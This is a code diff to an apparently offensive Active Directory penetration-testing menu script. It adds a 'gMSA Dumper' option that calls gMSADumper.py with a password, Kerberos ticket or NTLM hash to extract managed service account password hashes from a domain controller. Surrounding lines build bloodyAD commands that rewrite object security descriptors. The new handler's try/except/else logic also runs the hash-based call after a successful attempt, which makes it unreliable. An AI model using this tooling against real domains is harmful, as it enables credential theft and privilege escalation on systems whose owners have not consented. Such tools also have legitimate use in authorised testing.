@@ -851,7 +851,7 @@ def options():
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName.rstrip(" "), end= ' ')
-   print("(609)                (709) Certipy 9 (719) ADMinerGUI " + '\u2551')
+   print("(609) gMSA    Dumper (709) Certipy 9 (719) ADMinerGUI " + '\u2551')
    print('\u255A' + '\u2550'*280 + '\u255D')
    return
    
@@ -4956,7 +4956,31 @@ while True:
             localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'") 
       else:
          print("[i] Using HASH value as password credential...")    
-         localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'")
+         localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'")     
+      prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Old : Menu option selected - GMS Dumper
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '609':
+      SKEW = timeSync(SKEW)
+      if PAS[:2] != "''":            
+         try:
+            print(colored("[*] Attempting to dump the hash...", colour3))
+            print("[i] Using -k value as password credential...")
+            remoteCOM(keyPath + "gMSADumper.py -k -d " + DOM.rstrip(" ") + " -l " + SDM.rstrip(" "))
+         except:
+            print("[i] Using password credential...")
+            remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -l " + SDM.rstrip(" "))
+         else:
+            print("[i] Using HASH value as credential...")
+            remoteCOM(keyPath + "gMSADumper.py -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -l " + SDM.rstrip(" ")) 
       prompt()
       
 # ------------------------------------------------------------------------------------- 
